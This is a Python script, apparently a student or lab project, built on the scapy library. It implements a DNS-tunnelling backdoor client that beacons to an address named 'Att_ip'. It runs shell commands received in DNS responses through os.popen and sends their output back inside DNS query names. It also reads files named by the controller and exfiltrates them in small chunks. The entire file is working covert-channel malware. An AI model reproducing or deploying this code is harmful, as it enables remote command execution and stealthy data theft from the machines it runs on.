import subprocess
from tabnanny import verbose
from scapy.all import *
from scapy.all import DNS, DNSQR, DNSRR
from scapy.layers.inet import IP, UDP
import time
from base64 import b64decode, b64encode
from enum import IntEnum
import os
import time


Att_ip="10.0.2.15"
ICMP_ID_HELO = 23144
ICMP_ID = 54545
is_ready = False
TTL = 64
mtu = 24
seqnum = 64

def sendDNSReq(msg,flag, seqnum = 64, fileorprint = 1):
    domain = '.elad.com'
    if flag == '1' or flag == '3':
        domain = bytes(domain.encode())
        flag = bytes(flag.encode())
        print(type(flag), type(domain), type(msg))  
    if seqnum == 255:
        seqnum = 64
    
    dns_req = IP(dst=Att_ip, ttl=seqnum)/UDP(dport=53)/ DNS(rd=1, qd=DNSQR(qname=flag + msg + domain), tc=fileorprint)
    time.sleep(0.3)
    send(dns_req)
    
def sendhello():
    sendDNSReq("hi","8")


def DNSHandler(pkt):
    if not pkt[0]['DNS']['DNSRR']:
        return
    payload = pkt[0]['DNS']['DNSRR'].rdata[0].decode()    
    handle_flag = payload[0]
    print(handle_flag)
    match handle_flag:
        case "2":
            printHandler(payload[1:])
        case "1":
            fileHandler(payload[1:])

def fileHandler(file_path):
    ret_ok = ""
    global seqnum

    with open(file_path, "rb") as file:
        payload = file.read()
        
    while True: 
        if len(payload) > mtu:
            sendDNSReq( payload[:mtu], '1', seqnum, 0)
            ret_ok = checkOK()
            if ret_ok == "ok":
                payload = payload[mtu:]
                seqnum += 1

        else:        
            sendDNSReq(payload ,'3', seqnum, 0)
            ret_ok = checkOK()
            if ret_ok == "ok":
                seqnum = 64
                return
 


def printHandler(command):
    payload = os.popen(command).read()
    print(payload)
    global seqnum
    ret_ok = ""
    while True: 
        if len(payload) > mtu:
            sendDNSReq( payload[:mtu], '2', seqnum, 1)
            ret_ok = checkOK()
            print(ret_ok)
            if ret_ok == "ok":
                seqnum += 1
                payload = payload[mtu:]

        else:        
            sendDNSReq(payload ,'4',seqnum, 1)
            ret_ok = checkOK()
            if ret_ok == "ok":
                seqnum = 64
                break
 


def checkOK():
        #check filter
        pkt = sniff(filter="udp and src host 10.0.2.15 and udp[10] & 0x80 = 0", count=1, timeout = 3)
        if pkt:
            payload = pkt[0]['DNS']['DNSRR'].rdata[0].decode() 
            return payload[1:]


def listenRes():
    sniff(filter="udp and src host 10.0.2.15", prn=DNSHandler, timeout=5)

def main():
    while True:
        sendhello()
        listenRes()


if __name__ == "__main__":
    main()






 
